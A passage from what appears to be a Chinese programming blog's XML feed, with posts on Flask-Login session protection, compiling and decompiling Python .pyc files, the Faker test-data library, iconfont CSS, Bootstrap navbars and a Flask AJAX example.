False</p><ul><li>REMEMBER_COOKIE_REFRESH_EACH_REQUEST</li></ul><p>如果设置为True，cookie则会在每次请求时刷新，这会破坏生命周期，默认值：False</p><p>10.会话保护</p><p>虽然上述功能有助于保护您的“记住我”令牌免受Cookie窃贼的攻击，但会话Cookie仍然容易受到攻击。Flask-Login包括会话保护，以帮助防止用户的会话被盗。</p><p>你可以LoginManager在应用程序的配置中配置会话保护。如果启用，它可以在任一 模式basic或strong模式下运行。要将其设置为LoginManager，请将session_protection属性设置 为”basic”或”strong”：</p><pre><code>login_manager.session_protection = &quot;strong&quot;或者，禁用它：login_manager.session_protection = None</code></pre><p>默认情况下，它在”basic”模式下激活。它可以在应用程序的配置通过设置被禁用SESSION_PROTECTION设置None， “basic”或”strong”。</p><p>当会话保护处于活动状态时，每个请求都会为用户的计算机生成一个标识符（基本上是IP地址和用户代理的安全散列）。如果会话没有关联的标识符，则将存储生成的标识符。如果它有一个标识符，并且它与生成的标识符匹配，那么请求就可以了。</p><p>如果标识符在basic模式下不匹配，或者会话是永久性的，则会话将被简单地标记为非新鲜，并且任何需要重新登录的内容将强制用户重新进行身份验证。（当然，您必须已经在适当的时候使用新的登录才能产生效果。）</p><p>如果标识符在strong非永久会话的模式下不匹配，则删除整个会话（以及记忆标记，如果存在）。</p><p>11.禁用API的会话</p><p>在对API进行身份验证时，您可能希望禁用设置Flask会话cookie。为此，请使用自定义会话接口，该接口根据您在请求中设置的标志跳过保存会话。例如：</p><pre><code>from flask import gfrom flask.sessions import SecureCookieSessionInterfacefrom flask_login import user_loaded_from_headerclass CustomSessionInterface(SecureCookieSessionInterface):    &quot;&quot;&quot;Prevent creating session from API requests.&quot;&quot;&quot;    def save_session(self, *args, **kwargs):        if g.get(&#39;login_via_header&#39;):            return        return super(CustomSessionInterface, self).save_session(*args,                                                                **kwargs)app.session_interface = CustomSessionInterface()@user_loaded_from_header.connectdef user_loaded_from_header(self, user=None):    g.login_via_header = True</code></pre><p>12.本地化</p><p>默认情况下，LoginManager用于flash在需要用户登录时显示消息。这些消息是英文的。如果您需要本地化，请在发送之前将这些消息的localize_callback属性设置LoginManager为要调用的函数flash，例如gettext。将使用消息调用此函数，并将其返回值发送给flash。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python pyc文件</title>
      <link href="2020/05/20/2020-06-30-python_pyc/"/>
      <url>2020/05/20/2020-06-30-python_pyc/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是pyc文件"><a href="#什么是pyc文件" class="headerlink" title="什么是pyc文件"></a>什么是pyc文件</h3><p>原来Python的程序中，是把原始程序代码放在.py文件里，而Python会在执行.py文件的时候。将.py形式的程序编译成中间式文件（byte-compiled）的.pyc文件，这么做的目的就是为了加快下次执行文件的速度。因为py文件是可以直接看到源码的，编译成pyc后能够一定程度上防止源码的泄漏。</p><h3 id="生成单个pyc文件"><a href="#生成单个pyc文件" class="headerlink" title="生成单个pyc文件"></a>生成单个pyc文件</h3><p>python就是个好东西，它提供了内置的类库来实现把py文件编译为pyc文件，这个模块就是 py_compile 模块。</p><pre><code>import py_compilepy_compile.compile(r&#39;test.py&#39;)</code></pre><h3 id="批量生成pyc文件"><a href="#批量生成pyc文件" class="headerlink" title="批量生成pyc文件"></a>批量生成pyc文件</h3><p>一般来说，我们的工程都是在一个目录下的，一般不会说仅仅编译一个py文件而已，而是需要把整个文件夹下的py文件都编译为pyc文件，python又为了我们提供了另一个模块：compileall 。使用方法如下：</p><pre><code>import compileallcompileall.compile_dir(r&#39;./test&#39;)</code></pre><h3 id="利用uncompyle反编译pyc文件"><a href="#利用uncompyle反编译pyc文件" class="headerlink" title="利用uncompyle反编译pyc文件"></a>利用uncompyle反编译pyc文件</h3><pre><code># 安装pip3 install uncompyle# uncompyle常用命令uncompyle6 --help //查看帮助uncompyle6 servers.pyc &gt; servers.py  //将servers.pyc反编译成py文件 # 如果符合pep8规范，反编译效果非常好，但是之前代码的注释就没了。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python faker库生成虚拟数据</title>
      <link href="2020/05/19/2020-05-19-python_faker_virtual_data/"/>
      <url>2020/05/19/2020-05-19-python_faker_virtual_data/</url>
      
        <content type="html"><![CDATA[<h2 id="python-faker库生成虚拟数据"><a href="#python-faker库生成虚拟数据" class="headerlink" title="python faker库生成虚拟数据"></a>python faker库生成虚拟数据</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在软件需求、开发、测试过程中，有时候需要使用一些测试数据，针对这种情况，我们一般要么使用已有的系统数据，要么需要手动制造一些数据。由于现在的业务系统数据多种多样，千变万化。在手动制造数据的过程中，可能需要花费大量精力和工作量，此项工作既繁复又容易出错，而且，部分数据的手造工作无法保障：比如UUID类数据、MD5、SHA加密类数据等。</p><p>有一个Python包faker能够完成这方面的工作。</p><p> faker是一个Python包，开源的GITHUB项目，主要用来创建伪数据，使用Faker包，无需再手动生成或者手写随机数来生成数据，只需要调用Faker提供的方法，即可完成数据的生成。</p><p> 项目地址：<a href="https://github.com/joke2k/faker">https://github.com/joke2k/faker</a></p><p> 官方文档：<a href="https://faker.readthedocs.io/en/master/">https://faker.readthedocs.io/en/master/</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>pip install faker</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>导入</p><pre><code>from faker import Faker</code></pre><p>选择语言</p><pre><code>fake = Faker() # 默认英文fake = Faker(&#39;zh_CN&#39;)</code></pre><p>常见语言</p><pre><code>简体中文：zh_CN繁体中文：zh_TW美国英文：en_US英国英文：en_GB德文：de_DE日文：ja_JP韩文：ko_KR法文：fr_FR</code></pre><p>常用方法</p><p>速查表</p><p>地理信息伪数据</p><pre><code>fake.city_suffix()：市，县fake.city_name()：市名称如东莞（注意没有&#39;市&#39;）fake.country()：国家fake.country_code()：国家编码fake.district()：区fake.geo_coordinate()：地理坐标fake.latitude()：地理坐标(纬度)fake.longitude()：地理坐标(经度)fake.postcode()：邮编fake.province()：省份 (zh_TW没有此方法)fake.address()：详细地址如&#39;天津市惠州县龙潭郭街V座 193516&#39;fake.street_address()：街道地址fake.street_name()：街道名fake.street_suffix()：街、路fake.building_number()：&#39;b座&#39;</code></pre><p>基础信息伪数据</p><pre><code>fake.ssn()：生成身份证号fake.bs()：随机公司服务名fake.company()：随机公司名（长）fake.company_prefix()：随机公司名（短）fake.company_suffix()：公司性质如&#39;信息有限公司&#39;fake.credit_card_expire(start=&#39;now&#39;, end=&#39;+10y&#39;, date_format=&#39;%m/%y&#39;)：随机信用卡到期日如&#39;03/30&#39;fake.credit_card_full()：生成完整信用卡信息fake.credit_card_number(card_type=None)：信用卡号如&#39;4634641497776241478&#39;fake.credit_card_provider()：信用卡类型fake.credit_card_security_code()：信用卡安全码fake.job()：随机职位fake.first_name()：fake.first_name_female()：女性名fake.first_name_male()：男性名fake.first_romanized_name()：罗马名fake.last_name()：fake.last_name_female()：女姓fake.last_name_male()：男姓fake.last_romanized_name()：fake.name()：随机生成全名fake.name_female()：男性全名fake.name_male()：女性全名fake.romanized_name()：罗马名fake.msisdn()：移动台国际用户识别码，即移动用户的ISDN号码fake.phone_number()：随机生成手机号fake.phonenumber_prefix()：随机生成手机号段如&#39;139&#39;</code></pre><p>个人账户信息伪数据</p><pre><code>fake.ascii_company_email()：随机ASCII公司邮箱名fake.ascii_email()：随机ASCII邮箱fake.ascii_free_email()：fake.ascii_safe_email()：fake.company_email()：fake.email()：fake.free_email()：fake.free_email_domain()：fake.safe_email()：安全邮箱</code></pre><p>网络基础信息伪数据</p><pre><code>fake.domain_name()：生成域名fake.domain_word()：域词(即，不包含后缀)fake.ipv4()：随机IP4地址fake.ipv6()：随机IP6地址fake.mac_address()：随机MAC地址fake.tld()：网址域名后缀(.com,.net.cn,等等，不包括.)fake.uri()：随机URI地址fake.uri_extension()：网址文件后缀fake.uri_page()：网址文件（不包含后缀）fake.uri_path()：网址文件路径（不包含文件名）fake.url()：随机URL地址fake.user_name()：随机用户名fake.image_url()：随机URL地址</code></pre><p>浏览器信息伪数据</p><pre><code>fake.chrome()：随机生成Chrome的浏览器user_agent信息fake.firefox()：随机生成FireFox的浏览器user_agent信息fake.internet_explorer()：随机生成IE的浏览器user_agent信息fake.opera()：随机生成Opera的浏览器user_agent信息fake.safari()：随机生成Safari的浏览器user_agent信息fake.linux_platform_token()：随机Linux信息fake.user_agent()：随机user_agent信息</code></pre><p>文件信息伪数据</p><pre><code>fake.file_extension()：随机文件扩展名如&#39;avi&#39;，&#39;txt&#39;fake.file_name()：随机文件名（包含扩展名，不包含路径）fake.file_path()：随机文件路径（包含文件名，扩展名）fake.mime_type()：随机mime Type</code></pre><p>数字伪数据</p><pre><code>fake.numerify()：三位随机数字fake.random_digit()：0~9随机数fake.random_digit_not_null()：1~9的随机数fake.random_int()：随机数字，默认0~9999，可以通过设置min,max来设置fake.random_number()：随机数字，参数digits设置生成的数字位数fake.pyfloat()：left_digits=5 #生成的整数位数,right_digits=2 #生成的小数位数, positive=True #是否只有正数fake.pyint()：随机Int数字（参考random_int()参数）fake.pydecimal()：随机Decimal数字（参考pyfloat参数）</code></pre><p>文本加密伪数据</p><pre><code>fake.pystr()：随机字符串fake.random_element()：随机字母fake.random_letter()：随机字母fake.paragraph()：随机生成一个段落fake.paragraphs()：随机生成多个段落，通过参数nb来控制段落数，返回数组fake.sentence()：随机生成一句话fake.sentences()：随机生成多句话，与段落类似fake.text()：随机生成一篇文章（不要幻想着人工智能了，至今没完全看懂一句话是什么意思）fake.word()：随机生成词语fake.words()：随机生成多个词语，用法与段落，句子，类似fake.binary()：随机生成二进制编码fake.boolean()：True/Falsefake.language_code()：随机生成两位语言编码fake.locale()：随机生成语言/国际 信息fake.md5()：随机生成MD5fake.null_boolean()：NULL/True/Falsefake.password()：随机生成密码,可选参数：length：密码长度；special_chars：是否能使用特殊字符；digits：是否包含数字；upper_case：是否包含大写字母；lower_case：是否包含小写字母fake.sha1()：随机SHA1fake.sha256()：随机SHA256fake.uuid4()：随机UUID</code></pre><p>时间信息伪数据</p><pre><code>fake.am_pm()：AM/PMfake.century()：随机世纪fake.date(pattern=&#39;%Y-%m-%d&#39;, end_datetime=None)：随机日期如&#39;1993-08-03&#39;fake.date_between(start_date=&#39;-30y&#39;, end_date=&#39;today&#39;)：随机生成指定范围内日期，参数：start_date，end_date取值：具体日期或者today,-30d,-30y类似如datetime.date(2000, 7, 26)fake.date_between_dates()：随机生成指定范围内日期，用法同上如datetime.date(2020, 3, 18)fake.date_object()：随机生产从1970-1-1到指定日期的随机日期。fake.date_this_month()：生成这个月的时间如datetime.date(2020, 3, 3)fake.date_this_year()：生成这个年的时间如datetime.date(2020, 1, 17)fake.date_time()：随机生成指定时间（1970年1月1日至今）如datetime.datetime(406, 3, 4, 19, 3, 14)fake.date_time_ad()：生成公元1年到现在的随机时间fake.date_time_between()：用法同datesfake.future_date()：未来日期fake.future_datetime()：未来时间fake.month()：随机月份fake.month_name()：随机月份（英文）fake.past_date()：随机生成已经过去的日期fake.past_datetime()：随机生成已经过去的时间fake.time()：随机24小时时间fake.timedelta()：随机获取时间差fake.time_object()：随机24小时时间，time对象fake.time_series()：随机TimeSeries对象fake.timezone()：随机时区fake.unix_time()：随机Unix时间fake.year()：随机年份如&#39;1990&#39;fake.day_of_week()：当前周几如 &#39;Monday&#39;fake.iso8601(tzinfo=None, end_datetime=None) 当前时区时间如&#39;2007-07-24T06:05:39&#39;</code></pre><p>其他伪数据</p><pre><code>fake.currency_code()：货币编码fake.color_name()：随机颜色名fake.hex_color()：随机HEX颜色如&#39;#80d09a&#39;fake.rgb_color()：随机RGB颜色如&#39;198,177,26&#39;fake.safe_color_name()：随机安全色名fake.safe_hex_color()：随机安全HEX颜色如&#39;#111100&#39;fake.isbn10()：随机ISBN（10位）fake.isbn13()：随机ISBN（13位）fake.lexify()：替换所有问号（“？”）带有随机字母的事件。fake.pyiterable()：fake.pylist()：随机生成listfake.pyset()：随机生成集合fake.pystruct()：fake.pytuple()：fake.pydict()：fake.profile()：随机生成档案信息fake.simple_profile()：随机生成简单档案信息fake.dsv(dialect=&#39;faker-csv&#39;, header=None, data_columns=(&#39;&#123;&#123;name&#125;&#125;&#39;, &#39;&#123;&#123;address&#125;&#125;&#39;), num_rows=10, include_row_ids=False, **fmtparams)：随机文件内容如(&#39;&quot;赵彬&quot;,&quot;湖南省秀梅县孝南南昌路Q座 268638&quot;\r\n&#39;</code></pre><p>本文的速查方法是基于’zh_CN’其它语言可能部分方法不适用</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端引用阿里巴巴矢量图标库</title>
      <link href="2020/05/19/2020-05-19-import_alibaba_icon_in_frontend/"/>
      <url>2020/05/19/2020-05-19-import_alibaba_icon_in_frontend/</url>
      
        <content type="html"><![CDATA[<h2 id="前端引用阿里巴巴矢量图标库"><a href="#前端引用阿里巴巴矢量图标库" class="headerlink" title="前端引用阿里巴巴矢量图标库"></a>前端引用阿里巴巴矢量图标库</h2><p>引入的方式有很多种，具体可以查询<a href="https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8d11a391&helptype=code">官网</a></p><p>本文介绍一种font-class引用方法：</p><p>font-class是unicode使用方式的一种变种，主要是解决unicode书写不直观，语意不明确的问题。<br>与unicode使用方式相比，具有如下特点：</p><ul><li>兼容性良好，支持ie8+，及所有现代浏览器。</li><li>相比于unicode语意明确，书写更直观。可以很容易分辨这个icon是什么。</li><li>因为使用class来定义图标，所以当要替换图标时，只需要修改class里面的unicode引用。</li><li>不过因为本质上还是使用的字体，所以多色图标还是不支持的。</li></ul><p>使用步骤如下：</p><p>第一步：拷贝项目下面生成的fontclass代码：</p><pre><code>@font-face &#123;font-family: &quot;iconfont&quot;;src: url(&#39;//at.alicdn.com/t/font_8d5l8fzk5b87iudi.eot?t=1501489744354&#39;); /* IE9*/src: url(&#39;//at.alicdn.com/t/font_8d5l8fzk5b87iudi.eot?t=1501489744354#iefix&#39;) format(&#39;embedded-opentype&#39;), /* IE6-IE8 */url(&#39;//at.alicdn.com/t/font_8d5l8fzk5b87iudi.woff?t=1501489744354&#39;) format(&#39;woff&#39;), /* chrome, firefox */url(&#39;//at.alicdn.com/t/font_8d5l8fzk5b87iudi.ttf?t=1501489744354&#39;) format(&#39;truetype&#39;), /* chrome, firefox, opera, Safari, Android, iOS 4.2+*/url(&#39;//at.alicdn.com/t/font_8d5l8fzk5b87iudi.svg?t=1501489744354#iconfont&#39;) format(&#39;svg&#39;); /* iOS 4.1- */&#125;.iconfont &#123;font-family:&quot;iconfont&quot; !important;font-size:16px;font-style:normal;-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;&#125;.icon-tuichu:before &#123; content: &quot;\e604&quot;; &#125;.icon-fanhui:before &#123; content: &quot;\e608&quot;; &#125;.icon-facebook:before &#123; content: &quot;\e60e&quot;; &#125;.icon-twitter:before &#123; content: &quot;\e60f&quot;; &#125;.icon-xiangyou:before &#123; content: &quot;\e609&quot;; &#125;.icon-right:before &#123; content: &quot;\e60a&quot;; &#125;.icon-fanhui1:before &#123; content: &quot;\e60b&quot;; &#125;.icon-fenxiang:before &#123; content: &quot;\e632&quot;; &#125;.icon-xiangxia:before &#123; content: &quot;\e605&quot;; &#125;.icon-xiangxia1:before &#123; content: &quot;\e606&quot;; &#125;.icon-xiangxia2:before &#123; content: &quot;\e607&quot;; &#125;.icon-suofang:before &#123; content: &quot;\e677&quot;; &#125;.icon-chexiao:before &#123; content: &quot;\e688&quot;; &#125;.icon-esc:before &#123; content: &quot;\e629&quot;; &#125;.icon-chexiao1:before &#123; content: &quot;\e675&quot;; &#125;.icon-iconfont:before &#123; content: &quot;\e631&quot;; &#125;.icon-suoding:before &#123; content: &quot;\e633&quot;; &#125;.icon-bianji:before &#123; content: &quot;\e636&quot;; &#125;.icon-shoucang2:before &#123; content: &quot;\e638&quot;; &#125;.icon-xinjian:before &#123; content: &quot;\e639&quot;; &#125;.icon-shoucang1:before &#123; content: &quot;\e63a&quot;; &#125;.icon-gongkai:before &#123; content: &quot;\e63b&quot;; &#125;.icon-gouwuche1:before &#123; content: &quot;\e63c&quot;; &#125;.icon-zhongwen:before &#123; content: &quot;\e63f&quot;; &#125;.icon-shangchuan:before &#123; content: &quot;\e640&quot;; &#125;.icon-yingwen:before &#123; content: &quot;\e641&quot;; &#125;.icon-gouwuche2:before &#123; content: &quot;\e642&quot;; &#125;.icon-shanchu:before &#123; content: &quot;\e643&quot;; &#125;.icon-xiazai:before &#123; content: &quot;\e644&quot;; &#125;.icon-sousuo:before &#123; content: &quot;\e645&quot;; &#125;.icon-dashang:before &#123; content: &quot;\e634&quot;; &#125;.icon-xiangmu:before &#123; content: &quot;\e635&quot;; &#125;.icon-fuzhidaima1:before &#123; content: &quot;\e646&quot;; &#125;.icon-wofaqi:before &#123; content: &quot;\e647&quot;; &#125;.icon-xiangmuchengyuan:before &#123; content: &quot;\e648&quot;; &#125;.icon-gengduo:before &#123; content: &quot;\e649&quot;; &#125;.icon-wocanyu:before &#123; content: &quot;\e64a&quot;; &#125;.icon-lishi:before &#123; content: &quot;\e64b&quot;; &#125;.icon-piliang:before &#123; content: &quot;\e64c&quot;; &#125;.icon-shijian:before &#123; content: &quot;\e64d&quot;; &#125;.icon-gonggao:before &#123; content: &quot;\e652&quot;; &#125;.icon-weixin:before &#123; content: &quot;\e653&quot;; &#125;.icon-weibo:before &#123; content: &quot;\e654&quot;; &#125;.icon-gerenzhanghu:before &#123; content: &quot;\e637&quot;; &#125;.icon-tianjiachengyuan:before &#123; content: &quot;\e63d&quot;; &#125;.icon-soutubiao:before &#123; content: &quot;\e63e&quot;; &#125;.icon-souren:before &#123; content: &quot;\e655&quot;; &#125;.icon-yuzhanghao:before &#123; content: &quot;\e656&quot;; &#125;.icon-biaoqing:before &#123; content: &quot;\e657&quot;; &#125;.icon-qq:before &#123; content: &quot;\e658&quot;; &#125;.icon-weibo1:before &#123; content: &quot;\e659&quot;; &#125;.icon-zuoxuan:before &#123; content: &quot;\e65a&quot;; &#125;.icon-fangda2:before &#123; content: &quot;\e65b&quot;; &#125;.icon-zuo2:before &#123; content: &quot;\e65c&quot;; &#125;.icon-suoxiao:before &#123; content: &quot;\e65d&quot;; &#125;.icon-you2:before &#123; content: &quot;\e65e&quot;; &#125;.icon-suoxiao2:before &#123; content: &quot;\e65f&quot;; &#125;.icon-youxuan2:before &#123; content: &quot;\e660&quot;; &#125;.icon-zuo:before &#123; content: &quot;\e661&quot;; &#125;.icon-zuoxuan2:before &#123; content: &quot;\e662&quot;; &#125;.icon-shang:before &#123; content: &quot;\e663&quot;; &#125;.icon-shang2:before &#123; content: &quot;\e664&quot;; &#125;.icon-youxuan:before &#123; content: &quot;\e665&quot;; &#125;.icon-xia2:before &#123; content: &quot;\e666&quot;; &#125;.icon-fangda:before &#123; content: &quot;\e667&quot;; &#125;.icon-xia:before &#123; content: &quot;\e668&quot;; &#125;.icon-you:before &#123; content: &quot;\e669&quot;; &#125;.icon-zhuanrang:before &#123; content: &quot;\e66a&quot;; &#125;.icon-dianzan:before &#123; content: &quot;\e66b&quot;; &#125;.icon-huifu:before &#123; content: &quot;\e66c&quot;; &#125;.icon-saoyisao:before &#123; content: &quot;\e66d&quot;; &#125;.icon-shuoming:before &#123; content: &quot;\e600&quot;; &#125;.icon-jinggao:before &#123; content: &quot;\e601&quot;; &#125;.icon-jieshi:before &#123; content: &quot;\e602&quot;; &#125;.icon-youxiang:before &#123; content: &quot;\e603&quot;; &#125;.icon-guanbi:before &#123; content: &quot;\e60c&quot;; &#125;.icon-qunzhu:before &#123; content: &quot;\e60d&quot;; &#125;.icon-fuzhichenggong:before &#123; content: &quot;\e611&quot;; &#125;.icon-weijiaru:before &#123; content: &quot;\e612&quot;; &#125;.icon-daishenhe:before &#123; content: &quot;\e613&quot;; &#125;.icon-shenhetongguo:before &#123; content: &quot;\e614&quot;; &#125;.icon-shenhejujue:before &#123; content: &quot;\e615&quot;; &#125;.icon-xinjiantubiaoku:before &#123; content: &quot;\e616&quot;; &#125;.icon-tubiaoku:before &#123; content: &quot;\e617&quot;; &#125;.icon-gouwuche:before &#123; content: &quot;\e618&quot;; &#125;.icon-huidingbu:before &#123; content: &quot;\e619&quot;; &#125;.icon-dianzan1:before &#123; content: &quot;\e61a&quot;; &#125;.icon-morentouxiang:before &#123; content: &quot;\e610&quot;; &#125;.icon-paixu:before &#123; content: &quot;\e61b&quot;; &#125;.icon-wenjian:before &#123; content: &quot;\e61c&quot;; &#125;.icon-github:before &#123; content: &quot;\e61d&quot;; &#125;.icon-yuzhanghao1:before &#123; content: &quot;\e61e&quot;; &#125;.icon-weibo2:before &#123; content: &quot;\e61f&quot;; &#125;.icon-you1:before &#123; content: &quot;\e620&quot;; &#125;.icon-zuo1:before &#123; content: &quot;\e621&quot;; &#125;.icon-shang1:before &#123; content: &quot;\e622&quot;; &#125;.icon-iconfont1:before &#123; content: &quot;\e623&quot;; &#125;.icon-gonggaodayi:before &#123; content: &quot;\e625&quot;; &#125;.icon-gongnengjieshao:before &#123; content: &quot;\e626&quot;; &#125;.icon-tubiaohuizhi:before &#123; content: &quot;\e627&quot;; &#125;.icon-daimayingyong:before &#123; content: &quot;\e628&quot;; &#125;.icon-zhifubao:before &#123; content: &quot;\e624&quot;; &#125;.icon-alibaba:before &#123; content: &quot;\e62a&quot;; &#125;.icon-xiaomi:before &#123; content: &quot;\e62b&quot;; &#125;.icon-zhongguodianxin:before &#123; content: &quot;\e62c&quot;; &#125;.icon-tianmao:before &#123; content: &quot;\e62d&quot;; &#125;.icon-alimama:before &#123; content: &quot;\e62e&quot;; &#125;.icon-zhubajie:before &#123; content: &quot;\e62f&quot;; &#125;.icon-tengxunwang:before &#123; content: &quot;\e630&quot;; &#125;.icon-aliyun:before &#123; content: &quot;\e64e&quot;; &#125;.icon-taobaowang:before &#123; content: &quot;\e64f&quot;; &#125;.icon-anzhuo:before &#123; content: &quot;\e650&quot;; &#125;.icon-ios:before &#123; content: &quot;\e651&quot;; &#125;.icon-pcduan:before &#123; content: &quot;\e670&quot;; &#125;.icon-qingchu:before &#123; content: &quot;\e673&quot;; &#125;.icon-huizhiguize:before &#123; content: &quot;\e66e&quot;; &#125;.icon-zhizuoliucheng:before &#123; content: &quot;\e66f&quot;; &#125;.icon-fuzhidaima:before &#123; content: &quot;\e671&quot;; &#125;.icon-fankui1:before &#123; content: &quot;\e672&quot;; &#125;.icon-weitijiao:before &#123; content: &quot;\e674&quot;; &#125;.icon-chexiao2:before &#123; content: &quot;\e676&quot;; &#125;</code></pre><p>第二步：挑选相应图标并获取类名，应用于页面：</p><pre><code>&lt;i class=&quot;iconfont icon-xxx&quot;&gt;&lt;/i&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask Web程序开发流程</title>
      <link href="2020/05/15/2020-05-15-flask_web_app_dev_process/"/>
      <url>2020/05/15/2020-05-15-flask_web_app_dev_process/</url>
      
        <content type="html"><![CDATA[<h2 id="Flask-Web程序开发流程"><a href="#Flask-Web程序开发流程" class="headerlink" title="Flask Web程序开发流程"></a>Flask Web程序开发流程</h2><p>在实际的开发中,一个Web程序的开发过程要涉及多个角色,比如客户(提出需求)、项目经理(决定需求的实现方式)、开发者(实现需求)等,在这里我们假设是一个人全职开发。一般来说,一个Web程序的开发流程如下所示:</p><p>1)分析需求,列出功能清单或写需求说明书。</p><p>2)设计程序功能,写功能规格书和技术规格书。</p><p>3)进入开发与测试的迭代。</p><p>4)调试和性能等专项测试。</p><p>5)部署上线(deployment)。</p><p>6)运行维护与营销等。</p><p>写好功能规格书后,我们就可以进行实际的代码编写。在具体的开发中,代码编写主要分为前端页面(front end)和后端程序(backend)。前端开发的主要流程如下:</p><p>1)根据功能规格书画页面草图(sketching)。</p><p>2)根据草图做交互式原型图(prototyping)。</p><p>3)根据原型图开发前端页面(HTML、CSS、JavaScript)。</p><p>后端开发的主要流程如下:</p><p>1)数据库建模。</p><p>2)编写表单类。</p><p>3)编写视图函数和相关的处理函数。</p><p>4)在页面中使用Jinja2替换虚拟数据。</p><p>在实际开发中应该将测试融入整个开发流程中:每编写一部分代码,立刻编写对应的测试。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素</title>
      <link href="2020/05/15/2020-05-19-Bootstrap-navbar-fixed-top/"/>
      <url>2020/05/15/2020-05-19-Bootstrap-navbar-fixed-top/</url>
      
        <content type="html"><![CDATA[<h2 id="Bootstrap4-navbar-fixed-top-固定导航栏遮盖下方元素"><a href="#Bootstrap4-navbar-fixed-top-固定导航栏遮盖下方元素" class="headerlink" title="Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素"></a>Bootstrap4 navbar fixed-top 固定导航栏遮盖下方元素</h2><p>在Bootstrap4中，我们使用 .fixed-top 类来实现导航栏的固定：</p><pre><code>nav class=&quot;navbar navbar-expand-sm bg-dark navbar-dark fixed-top&quot;&gt;...&lt;/nav&gt;</code></pre><p>但这种方式会遮盖下方元素</p><p>两种解决方式：</p><p>（1）向<body>元素添加样式style=”padding-top: 50px;”，顶部填充的实际大小可自己调整。</p><p>（2）向div.nav-bar.fixed-top元素添加样式style=”position: sticky;”，实际是修改该导航栏元素的定位属性position，从原本的fixed到sticky。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单例子实现AJAX异步加载更多功能</title>
      <link href="2020/05/14/2020-05-14-flask_ajax_loadmore/"/>
      <url>2020/05/14/2020-05-14-flask_ajax_loadmore/</url>
      
        <content type="html"><![CDATA[<h2 id="简单例子实现AJAX异步加载更多功能"><a href="#简单例子实现AJAX异步加载更多功能" class="headerlink" title="简单例子实现AJAX异步加载更多功能"></a>简单例子实现AJAX异步加载更多功能</h2><pre><code>from flask import Flaskapp = Flask(__name__)from jinja2.utils import generate_lorem_ipsum@app.route(&#39;/post&#39;)def show_post():    post_body = generate_lorem_ipsum(n=2) # 生成两段虚拟随机文本    return &#39;&#39;&#39;&lt;h1&gt;A very long post&lt;/h1&gt;&lt;div class=&quot;body&quot;&gt;%s&lt;/div&gt;&lt;button id=&quot;load&quot;&gt;Load More&lt;/button&gt;&lt;script src=&quot;https://code.jquery.com/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;$(function() &#123;    $(&#39;#load&#39;).click(function() &#123;        $.ajax(&#123;            url: &#39;/more&#39;,// 目标URL            type: &#39;get&#39;,// 请求方法            success: function(data)&#123;// 返回2XX响应后触发的回调函数                $(&#39;.body&#39;).append(data);// 将返回的响应插入到页面中            &#125;        &#125;)    &#125;)&#125;)&lt;/script&gt;&#39;&#39;&#39; % post_body@app.route(&#39;/more&#39;)def load_post():    return generate_lorem_ipsum(n=1)if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令设置环境变量</title>
      <link href="2020/05/14/2020-05-14-set_environment_variables/"/>
      <url>2020/05/14/2020-05-14-set_environment_variables/</url>
      
        <content type="html"><![CDATA[<h2 id="命令设置环境变量"><a href="#命令设置环境变量" class="headerlink" title="命令设置环境变量"></a>命令设置环境变量</h2><p>例如：设置环境变量FLASK_APP</p><p>Linux或macOS系统使用export命令:</p><pre><code>export FLASK_APP=hello</code></pre><p>在Windows系统中使用set命令:</p><pre><code>set FLASK_APP=hello</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境变量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql视图的作用</title>
      <link href="2020/05/13/2020-05-13-mysql_view/"/>
      <url>2020/05/13/2020-05-13-mysql_view/</url>
      
